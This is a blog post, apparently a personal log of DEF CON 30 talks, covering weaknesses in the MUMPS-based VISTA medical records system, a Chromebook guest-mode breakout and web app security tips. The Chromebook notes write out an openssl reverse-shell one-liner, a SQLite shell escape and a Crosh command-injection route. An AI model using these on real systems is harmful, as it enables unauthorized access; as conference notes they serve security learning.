@@ -1,0 +1,57 @@
+---
+title: DEF CON 30
+date: 2022-08-13 12:00:00.000000000 Z
+layout: post-external
+original_link: https://cardboard-iguana.com/log/2022-08-13-def-con-30.html
+author: 100007
+---
+
+<h1 id="def-con-30">DEF CON 30</h1>
+<p><strong>author:</strong> Nathan Acks<br />
+<strong>date:</strong> 2022-08-13</p>
+<p>DEF CON talks in the morning, and another workshop this afternoon.</p>
+<ul>
+<li><a href="https://defcon.org/html/defcon-30/dc-30-index.html">DEF CON 30</a></li>
+</ul>
+<h1 id="how-to-get-mumps-thirty-years-later">How to Get MUMPS Thirty Years Later</h1>
+<p>SIDE NOTE: Zach uses a text-based slide generation tool called Moebius.</p>
+<p>MUMPS is a versatile language (and development environment) originally developed for the VA. I predates *NIX and is incredibly versatile - it’s also used by other hospitals, police departments, banks, and even the ESA.</p>
+<p>MUMPS has some interesting features: All keywords can be shortened to a single character. White space matters (except for newlines). Math is evaluated left-to-right (there’s no sense of order of operations <code class="language-plaintext highlighter-rouge">O_o</code>). Dates are comma-delineated strings that start in 1838 (and support up to the year 9999).</p>
+<p>MUMPS can be treated as both a scripted and compiled language.</p>
+<p>More than 50% of all electronic medical records pass through some sort of MUMPS application.</p>
+<p>VISTA is a platform for handling electronic medical records that is written in MUMPS specifically for use by the Veterans’ Administration.</p>
+<p>In hospitals, clients talk to VISTA using a network RPC. The most common client is CPRS (it’s written in a slightly more modern language, DELPHI <code class="language-plaintext highlighter-rouge">O_o</code>).</p>
+<p>CPRS/VISTA are <em>extremely</em> chatty on the network.</p>
+<p>VISTA uses a roll-your-own encryption scheme from the 1990s. Encryption can be trivially broken. Packets can be replayed. And there are hard-coded creds (though Zach doesn’t think that these are exploitable). So, be sure to layer TLS onto any MUMPS implementations!</p>
+<p>Zach’s had trouble getting the VA to talk to them, so disclosure’s still ongoing here.</p>
+<p>VISTA is <em>really</em> well-loved by the doctors who use it.</p>
+<ul>
+<li><a href="https://cardboard-iguana.com/log/assets/how-to-get-mumps-thirty-years-later-or-hacking-the-government-via-foiad-code-zachary-minneker.pptx">How to Get MUMPS Thirty Years later (or, Hacking the Government via FOIA’d Code)</a></li>
+<li><a href="https://blocktronics.github.io/moebius/">Moebius ANSI Art Editor</a></li>
+</ul>
+<h1 id="chromebook-breakout">Chromebook Breakout</h1>
+<p>This is the Lost Rabbit Labs people. I saw them at a DC 303 meet-up.</p>
+<p>This vulnerability was actually patched two years ago by Google…</p>
+<p>This is a breakout from the Chrome OS guest user via the the Crosh shell using command injection in the <code class="language-plaintext highlighter-rouge">set_*</code> commands.</p>
+<p>The Pico Ducky is a Rubber Ducky work-alike that runs on a Raspberry Pi Pico. It’s much faster than Hak5’s tool.</p>
+<p>Interesting redirect trick - use <code class="language-plaintext highlighter-rouge">1&gt;&amp;2</code> to redirect STDOUT to STDERR (the reverse of what is normally done) to bypass some output filtering.</p>
+<p>You can pipe <code class="language-plaintext highlighter-rouge">sh</code> through <code class="language-plaintext highlighter-rouge">openssl</code> for a reverse shell! Something like: <code class="language-plaintext highlighter-rouge">mkfifo /tmp/irl; /bin/sh -i &lt; /tmp/irl 2&gt;&amp;1 | openssl s_client -quiet -connect 127.0.0.1:1337 &gt; tmp/irl; rm /tmp/irl</code></p>
+<p>In older versions of Chrome OS, the Crosh shell could actually be launched in Dev Mode (without switching the entire box to Dev Mode) using <code class="language-plaintext highlighter-rouge">crosh --dev</code> (via <code class="language-plaintext highlighter-rouge">set_apn</code> command injection).</p>
+<p>SQLite shell escape: <code class="language-plaintext highlighter-rouge">.shell bash</code></p>
+<p>Oof… There were (are?) hard-coded SSH public keys on Chrome OS; the corresponding private key was (is?) available in the Chromium code repo.</p>
+<p>Chrome OS has a restricted <code class="language-plaintext highlighter-rouge">finger</code> command called <code class="language-plaintext highlighter-rouge">pinky</code> that’s used internally.</p>
+<p>If you can get to <code class="language-plaintext highlighter-rouge">dbus</code> on a Chromebook, you can access <em>some</em> (but not all!) Dev Mode tools (like <code class="language-plaintext highlighter-rouge">ping</code>).</p>
+<p>(I wasn’t able to catch the end of this presentation, however, as I needed to head out to my last workshop…)</p>
+<ul>
+<li><a href="https://cardboard-iguana.com/log/assets/chromebook-breakout-escaping-jail-with-your-friends-using-a-pico-ducky-jimi-allee.pdf">Chromebook Breakout: Escaping Jail, With Your Friends, Using a Pico Ducky</a></li>
+<li><a href="https://github.com/dbisu/pico-ducky">Pico Ducky</a></li>
+</ul>
+<h1 id="securing-web-apps">Securing Web Apps</h1>
+<p>TIL: There is such a thing as NoSQLi, and it’s <em>way</em> easier than SQLi - just drop objects containing search operators into the NoSQL queries instead of actual data!</p>
+<p>You can search within packets in Wireshark using the filter <code class="language-plaintext highlighter-rouge">frame contains "$TEXT_TO_SEARCH"</code>.</p>
+<p>If you can find an encryption key in a packet dump, you can try applying them to encrypted packets in Wireshark using “Preferences &gt; RSA Keys”.</p>
+<p>Wireshark can easily extract files from HTTP conversations. To extract them from raw TCP streams, (1) locate the beginning of the stream, (2) right-click on the packet and select “Follow &gt; TCP Stream, (3) change “Show data as” to “Raw”, and (4) save it off using “Save As”.</p>
+<ul>
+<li><a href="https://forum.defcon.org/node/241772">Securing Web Apps</a></li>
+<li><a href="https://infosecwriteups.com/nosql-injection-8732c2140576">How to pull off a successful NoSQL Injection attack</a></li>
+</ul>
